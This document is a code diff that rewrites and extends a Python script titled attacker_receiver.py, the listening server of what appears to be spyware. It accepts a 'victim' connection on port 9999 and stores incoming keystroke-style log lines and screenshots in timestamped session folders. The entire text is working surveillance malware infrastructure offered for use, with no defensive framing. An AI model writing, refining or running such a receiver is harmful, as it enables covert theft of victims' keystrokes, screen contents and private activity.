@@ -1,74 +1,134 @@
+# attacker_receiver.py
 import socket
 import os
+import sys
+import datetime
+import threading
 
-def serveur():
-    os.makedirs("received_screenshots", exist_ok=True)
-    log_file = open("received_logs.txt", "a", encoding="utf-8")
+def generate_session_folder():
+    """Creates a timestamped folder for this session."""
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    folder_name = f"session_{timestamp}"
+    os.makedirs(folder_name, exist_ok=True)
+    os.makedirs(os.path.join(folder_name, "screenshots"), exist_ok=True)
+    return folder_name
 
+def main():
+    # Generate unique session folder
+    session_folder = generate_session_folder()
+    print(f"[+] Session folder created: {session_folder}")
+
+    # Open log file inside session folder
+    log_file_path = os.path.join(session_folder, "full_activity.log")
+    log_file = open(log_file_path, "a", encoding="utf-8")
+    
+    def log_and_print(message):
+        """Print to console and write to log file."""
+        print(message)
+        log_file.write(message + "\n")
+        log_file.flush()
+
+    # Setup server
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("0.0.0.0", 4444))
-    s.listen(1)
-    print("En attente de connexion...")
-    conn, addr = s.accept()
-    print(f"Connecté par {addr}")
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    try:
+        s.bind(("0.0.0.0", 9999))
+        s.listen(1)
+        log_and_print("[+] Listening for victim on port 9999...")
+    except Exception as e:
+        log_and_print(f"[-] Failed to bind/listen: {e}")
+        log_file.close()
+        return
 
     try:
+        conn, addr = s.accept()
+        log_and_print(f"[+] Connected by {addr}")
+        
+        # Set timeout to avoid hanging
+        conn.settimeout(5.0)
+
+        buffer = b""
         while True:
-            header = b""
-            # Lire la ligne d'en-tête (finie par \n)
-            while not header.endswith(b"\n"):
-                chunk = conn.recv(1)
+            try:
+                # Receive data in chunks
+                chunk = conn.recv(4096)
                 if not chunk:
-                    raise ConnectionError("Connexion fermée")
-                header += chunk
+                    log_and_print("[-] Connection closed by victim.")
+                    break
 
-            header = header.decode().strip()
-            if header.startswith("LOG|"):
-                # Log reçu
-                message = header[4:]
-                print(f"[LOG] {message}")
-                log_file.write(message + "\n")
-                log_file.flush()
+                buffer += chunk
 
-            elif header.startswith("IMAGE|"):
-                # Format: IMAGE|filename|taille
-                parts = header.split("|")
-                if len(parts) != 3:
-                    print("Header image mal formé :", header)
-                    continue
+                # Process all complete lines in buffer
+                while b"\n" in buffer:
+                    line, _, buffer = buffer.partition(b"\n")
+                    line = line.strip().decode("utf-8", errors="ignore")
 
-                _, filename, taille_str = parts
-                taille = int(taille_str)
+                    if line.startswith("LOG|"):
+                        message = line[4:]
+                        log_and_print(f"[📝 LOG] {message}")
 
-                print(f"[IMAGE] Réception de {filename} ({taille} bytes)")
+                    elif line.startswith("IMAGE|"):
+                        try:
+                            _, filename, size_str = line.split("|", 2)
+                            size = int(size_str)
+                            log_and_print(f"[📸] Receiving image: {filename} ({size} bytes)")
+                            
+                            # Receive exactly 'size' bytes
+                            image_data = b""
+                            remaining = size
+                            while remaining > 0:
+                                chunk = conn.recv(min(4096, remaining))
+                                if not chunk:
+                                    raise ConnectionError("Connection closed during transfer")
+                                image_data += chunk
+                                remaining -= len(chunk)
+                                print(f"[📸] Received {len(image_data)}/{size} bytes")
+                            
+                            # Save image
+                            image_path = os.path.join(session_folder, "screenshots", filename)
+                            with open(image_path, "wb") as f:
+                                f.write(image_data)
+                            log_and_print(f"[✅] Image saved: {image_path}")
+                            
+                        except Exception as e:
+                            log_and_print(f"[❌] Error receiving image: {e}")
 
-                # Lire le contenu de l'image
-                remaining = taille
-                image_data = b""
-                while remaining > 0:
-                    data = conn.recv(min(4096, remaining))
-                    if not data:
-                        raise ConnectionError("Connexion fermée pendant transfert image")
-                    image_data += data
-                    remaining -= len(data)
+                    else:
+                        log_and_print(f"[📡 UNKNOWN] {line}")
 
-                # Sauvegarder l'image
-                chemin = os.path.join("received_screenshots", filename)
-                with open(chemin, "wb") as f:
-                    f.write(image_data)
+            except socket.timeout:
+                # Check if connection is still alive
+                try:
+                    conn.send(b"")  # This will fail if connection is dead
+                except:
+                    log_and_print("[-] Connection timed out or lost.")
+                    break
+                continue  # No data, but connection alive
 
-                print(f"[IMAGE] Enregistrée : {chemin}")
+            except ConnectionResetError:
+                log_and_print("[-] Connection reset by victim.")
+                break
 
-            else:
-                print("[INFO] Header inconnu :", header)
+            except Exception as e:
+                log_and_print(f"[💥] Unexpected error: {e}")
+                break
 
     except Exception as e:
-        print(f"[Erreur] {e}")
+        log_and_print(f"[❌] Accept error: {e}")
 
     finally:
-        log_file.close()
-        conn.close()
-        s.close()
+        log_and_print("[🛑] Receiver shutting down.")
+        try:
+            log_file.close()
+            conn.close()
+            s.close()
+        except:
+            pass
 
 if __name__ == "__main__":
-    serveur()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[🛑] Receiver interrupted by user.")
+        sys.exit(0)
